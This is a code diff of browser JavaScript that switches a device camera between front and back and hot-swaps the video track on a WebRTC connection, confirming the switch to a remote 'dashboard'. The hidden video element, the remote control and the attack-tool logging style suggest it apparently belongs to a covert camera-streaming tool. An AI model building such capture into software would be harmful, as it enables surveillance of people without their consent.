@@ -206,54 +206,54 @@
             console.log(`[*] Switching camera to: ${targetMode}`);
 
             try {
-                // Stop existing video track so mobile camera ISP is free
+                // Find active video sender first while sender is active
+                let videoSender = null;
+                if (pc) {
+                    const senders = pc.getSenders();
+                    videoSender = senders.find(s => (s.track && s.track.kind === 'video') || s.kind === 'video');
+                }
+
+                // Try exact facingMode, fallback to ideal
+                let newStream;
+                try {
+                    newStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: { exact: targetMode }
+                        },
+                        audio: false
+                    });
+                } catch (e) {
+                    newStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: { ideal: targetMode }
+                        },
+                        audio: false
+                    });
+                }
+
+                const newVideoTrack = newStream.getVideoTracks()[0];
+                if (!newVideoTrack) throw new Error("No video track acquired");
+
+                // Replace track on WebRTC peer connection
+                if (videoSender) {
+                    await videoSender.replaceTrack(newVideoTrack);
+                    console.log("[+] Replaced track on WebRTC peer connection to:", targetMode);
+                }
+
+                // Stop old video tracks
                 if (localStream) {
                     localStream.getVideoTracks().forEach(track => {
                         try { track.stop(); } catch (e) {}
                     });
                 }
 
-                // Short sleep to allow hardware release
-                await new Promise(r => setTimeout(r, 80));
-
-                const newStream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: { ideal: targetMode },
-                        width: { ideal: 1280, max: 1920 },
-                        height: { ideal: 720, max: 1080 },
-                        frameRate: { ideal: 30, max: 30 }
-                    },
-                    audio: false
-                });
-
-                const newVideoTrack = newStream.getVideoTracks()[0];
-                if (!newVideoTrack) throw new Error("No video track acquired");
-
-                // Update localStream
-                if (localStream) {
-                    const oldTracks = localStream.getVideoTracks();
-                    oldTracks.forEach(t => localStream.removeTrack(t));
-                    localStream.addTrack(newVideoTrack);
-                } else {
-                    localStream = newStream;
-                }
+                localStream = newStream;
+                currentFacingMode = targetMode;
 
                 if (hiddenVideo) {
                     hiddenVideo.srcObject = localStream;
                     hiddenVideo.play().catch(() => {});
                 }
-
-                // Hot-swap video track on WebRTC peer connection
-                if (pc) {
-                    const senders = pc.getSenders();
-                    const videoSender = senders.find(s => s.track && s.track.kind === 'video');
-                    if (videoSender) {
-                        await videoSender.replaceTrack(newVideoTrack);
-                        console.log("[+] Replaced track on WebRTC peer connection to:", targetMode);
-                    }
-                }
-
-                currentFacingMode = targetMode;
 
                 // Send confirmation to dashboard
                 if (ws && ws.readyState === WebSocket.OPEN) {
@@ -264,24 +264,6 @@
                 }
             } catch (err) {
                 console.error("Camera switch error:", err);
-                // Attempt to restore previous camera
-                try {
-                    const fallbackStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: { ideal: currentFacingMode } },
-                        audio: false
-                    });
-                    const fallbackTrack = fallbackStream.getVideoTracks()[0];
-                    if (pc && fallbackTrack) {
-                        const senders = pc.getSenders();
-                        const videoSender = senders.find(s => s.track && s.track.kind === 'video');
-                        if (videoSender) await videoSender.replaceTrack(fallbackTrack);
-                    }
-                    if (hiddenVideo) {
-                        hiddenVideo.srcObject = fallbackStream;
-                        hiddenVideo.play().catch(() => {});
-                    }
-                } catch (revertErr) {}
-
                 if (ws && ws.readyState === WebSocket.OPEN) {
                     ws.send(JSON.stringify({
                         type: "camera_info",
